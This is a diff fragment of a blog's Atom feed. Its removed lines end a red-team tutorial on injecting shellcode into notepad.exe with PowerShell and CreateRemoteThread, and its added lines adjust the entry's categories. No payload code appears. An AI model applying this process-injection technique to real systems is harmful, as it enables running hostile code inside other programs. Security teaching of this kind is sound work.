-    <p>Starts a new thread <strong>inside notepad.exe</strong>, with the <strong>start address pointing to your shellcode</strong>.</p>
-  </li>
-  <li>
-    <p>This is the moment the shellcode begins executing.</p>
-  </li>
-</ul>
-
-<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread function</a></p>
-
-<hr />
-
-<h3 id="step-8-confirmation">Step 8: Confirmation</h3>
-
-<p><code class="language-plaintext highlighter-rouge">Write-Host "Shellcode injected successfully!"</code></p>
-
-<p>If you see this message congrats, you just injected and executed arbitrary code in another process using nothing but PowerShell and some native Windows APIs.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><summary type="html"><![CDATA[]]></summary></entry></feed>
